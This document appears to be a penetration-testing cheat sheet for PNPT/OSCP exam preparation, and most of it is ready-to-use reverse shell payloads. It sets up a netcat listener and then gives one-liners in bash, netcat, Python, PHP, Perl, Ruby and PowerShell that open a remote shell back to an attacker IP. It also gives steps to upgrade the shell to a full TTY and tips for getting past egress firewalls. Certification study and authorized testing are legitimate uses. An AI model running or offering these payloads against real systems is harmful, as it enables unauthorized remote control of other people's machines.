---
title: Reverse Shell Cheatsheet (PNPT/OSCP)
---


First, start a listener on your attacker machine to catch the incoming connection. **Always start your listener first!**

**Your IP Address:** `10.10.10.10` (replace with your actual TUN0/VPN IP)
**Your Port:** `443` (using common ports like 80, 443, or 53 can sometimes bypass firewall egress filters)

### Netcat (`nc`)

The classic. Reliable and simple.

```shell
sudo nc -nvlp 443
```

 - `-n`: No DNS resolution (faster).
 - `-v`: Verbose output (shows you when a connection comes in).
 - `-l`: Listen mode.
 - `-p`: Port number to listen on.
 - `sudo`: Use sudo if you're listening on a privileged port (1-1024).

## The Payloads: Getting the Shell

Run one of these commands on the target/victim machine.

### Bash

The most common shell on Linux.

**Standard TCP:**

```shell
bash -i >& /dev/tcp/10.10.10.10/443 0>&1
```

**Shorter Version:**

```shell
bash -c 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1'
```

### Netcat (nc)

If `nc` is on the target, it can be used to send a shell back.

**Classic (requires `-e` flag, which is often disabled):**

```shell
nc -e /bin/bash 10.10.10.10 443
```

**FIFO Pipe (if -e is missing):**

```shell
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 443 > /tmp/f
```

### Python

Almost always available on Linux systems.

### Python 2:

```py
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Python 3:

```shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
```

### PHP

Very common for web server command injection vulnerabilities.

```php
php -r '$sock=fsockopen("10.10.10.10",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

:::note If injecting into a web URL, you may need to URL-encode this payload. Use a tool like **CyberChef**.
:::

### Perl

```perl
perl -e 'use Socket;$i="10.10.10.10";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.10.10.10",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Windows Payloads

### PowerShell (Very Common)

This is your go-to for modern Windows systems.

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

 - `nop` stands for `NoProfile`, which makes it load faster.

### nc.exe

If you can upload a file, upload `nc.exe` (a common version is available with the `Nmap` installation on Windows).

```cmd
nc.exe -e cmd.exe 10.10.10.10 443
```

##  Upgrading to a Fully Interactive TTY

You've got a shell, but it's basic. You can't use tab complete, arrow keys, or `clear`. Let's fix that.

### Step 1: Spawn a better shell with Python (on the victim machine)

This is the most common method.

```py
python3 -c 'import pty; pty.spawn("/bin/bash")'
# If python3 isn't available, try 'python' or 'python2'
```

### Step 2: Get Terminal Info (on your attacker machine)

Check your terminal size.

```shell
stty size
# Output might be: 24 80
```

### Step 3: Background the shell (on your attacker machine)

Press **Ctrl + Z** to background your `nc` listener.

### Step 4: Set up your local terminal (on your attacker machine)

This command gives your local terminal raw mode, so keystrokes like `Ctrl+C` are passed to the remote host instead of killing your shell.

```shell
stty raw -echo; fg
```

After typing this, type `fg` and press Enter. This will bring your reverse shell back to the foreground.

### Step 5: Final Setup (on the victim machine)

Your shell will look weird and might not show what you type.** Just type these commands blindly and press Enter.**

```shell
reset
export SHELL=bash
export TERM=xterm-256color
stty rows 24 cols 80 # Use the values from Step 2
```

Congratulations! You now have a fully interactive shell. You can use arrow keys, tab completion, `clear`, `su`, `ssh`, and `nano`/`vim`.


## Troubleshooting Tips

 - **Connection Refused**: Your listener isn't running, you used the wrong port, or a firewall on the victim's end is blocking the connection.
 - **Connection Times Out**: An egress firewall on the victim's network is blocking the outbound connection. Try a different port (80, 53, 8080).
 - **Shell Immediately Dies**: You might be catching the shell with /bin/sh which doesn't have an interactive mode. Try specifying /bin/bash in your payload. Also, ensure your listener is still running.
 - **Command Not Found**: The payload you're using (python, nc, perl) doesn't exist on the target. Enumerate the system's /bin and /usr/bin directories to see what's available and use a different payload.
 - **URL Encoding**: For web exploits, make sure your payload is properly URL encoded. A space (     ) becomes %20, a plus (+) becomes %2B, a quote (') becomes %27, etc. Use CyberChef to be safe.
